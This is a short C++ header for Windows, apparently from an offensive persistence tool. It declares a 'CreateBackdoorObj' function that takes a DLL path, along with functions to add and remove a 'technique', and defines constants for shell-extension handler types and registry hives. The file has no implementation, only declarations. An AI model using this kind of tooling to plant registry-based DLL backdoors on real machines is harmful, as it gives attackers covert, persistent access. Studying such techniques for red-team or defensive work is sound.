#pragma once

#include <string>
#include <Windows.h>


#define HKCU 0
#define HKCR 1


#define ICON_OVERLAY 0x1
#define ICON_HANDLER 0x2
#define DROP_HANDLER 0x3
#define PROPERTY_SHEET_HANDLER 0x4
#define THUMBNAIL_IMAGE_HANDLER 0x5
#define INFOTIP_HANDLER 0x6
#define METADATA_HANDLER 0x7
#define COPY_HOOK_HANDLER 0x8


namespace reg {

	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath);
	BOOL AddTechnique(_In_ BYTE type, _In_opt_ WCHAR* ext, _In_ GUID Guid);
	BOOL RemoveTechnique(_In_ BYTE type, _In_ WCHAR* ext);

}